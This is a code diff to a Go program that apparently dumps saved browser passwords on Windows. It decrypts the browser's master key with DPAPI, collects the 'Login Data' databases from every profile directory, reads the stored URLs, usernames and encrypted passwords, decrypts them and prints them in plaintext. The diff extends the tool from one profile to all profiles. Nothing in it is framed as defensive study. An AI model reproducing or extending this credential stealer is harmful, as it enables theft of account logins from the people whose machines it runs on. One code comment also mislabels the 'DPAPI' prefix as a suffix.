@@ -10,6 +10,7 @@ import (
 	"io"
 	"os"
 	"path/filepath"
+	"regexp"
 	"syscall"
 	"unsafe"
 
@@ -53,6 +54,8 @@ func dpapiDecrypt(data []byte) ([]byte, error) {
 
 // Utils
 
+var profileDirRegexp = regexp.MustCompile(`^Profile*|^Default$`)
+
 func copyFile(src, dst string) error {
 	file, err := os.ReadFile(src)
 	if err != nil {
@@ -89,7 +92,28 @@ func getLoginDataPath() (string, error) {
 	return filepath.Join(userDataPath, "Default", "Login Data"), nil
 }
 
-// Start
+func getLoginDataPaths() ([]string, error) {
+	var paths []string
+	userDataPath, err := getUserDataPath()
+	if err != nil {
+		return nil, err
+	}
+	files, err := os.ReadDir(userDataPath)
+	if err != nil {
+		return nil, err
+	}
+	for _, file := range files {
+		if file.IsDir() && profileDirRegexp.MatchString(file.Name()) {
+			filePath := filepath.Join(userDataPath, file.Name(), "Login Data")
+			if _, err := os.Stat(filePath); err == nil {
+				paths = append(paths, filePath)
+			}
+		}
+	}
+	return paths, nil
+}
+
+// Passowords decrypt
 
 func getMasterKey() ([]byte, error) {
 	localStatePath, err := getLocalStatePath()
@@ -113,7 +137,7 @@ func getMasterKey() ([]byte, error) {
 	if err != nil {
 		return nil, err
 	}
-	return dpapiDecrypt(cryptedMasterKey[5:])
+	return dpapiDecrypt(cryptedMasterKey[5:]) // Remove "DPAPI" suffix
 }
 
 func decryptPassword(masterKey, encryptedPassword []byte) (string, error) {
@@ -141,36 +165,47 @@ func main() {
 		panic(err)
 	}
 
-	dbFile, err := getLoginDataPath()
+	loginDataPaths, err := getLoginDataPaths()
 	if err != nil {
 		panic(err)
 	}
 
-	copyFile(dbFile, "db.sqlite")
-
-	db, err := sql.Open("sqlite3", "db.sqlite")
-	if err != nil {
-		panic(err)
-	}
-	defer db.Close()
-
-	rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
-	if err != nil {
-		panic(err)
-	}
-	defer rows.Close()
-
-	for rows.Next() {
-		var url, username string
-		var encryptedPassword []byte
-		err := rows.Scan(&url, &username, &encryptedPassword)
+	for _, loginDataPath := range loginDataPaths {
+		// Copy database to avoid "database is locked" error
+		dbFileName := "db.sqlite"
+		err := copyFile(loginDataPath, dbFileName)
 		if err != nil {
 			panic(err)
 		}
-		password, err := decryptPassword(masterKey, encryptedPassword)
+		defer os.Remove(dbFileName)
+
+		// Connect to the database
+		db, err := sql.Open("sqlite3", dbFileName)
 		if err != nil {
 			panic(err)
 		}
-		fmt.Println(url, username, password)
+		defer db.Close()
+
+		// Extract urls, usernames and encrypted passwords
+		rows, err := db.Query("SELECT action_url, username_value, password_value FROM logins")
+		if err != nil {
+			panic(err)
+		}
+		defer rows.Close()
+
+		// Loop over records
+		for rows.Next() {
+			var url, username string
+			var encryptedPassword []byte
+			err := rows.Scan(&url, &username, &encryptedPassword)
+			if err != nil {
+				panic(err)
+			}
+			password, err := decryptPassword(masterKey, encryptedPassword)
+			if err != nil {
+				panic(err)
+			}
+			fmt.Println(url, username, password)
+		}
 	}
 }
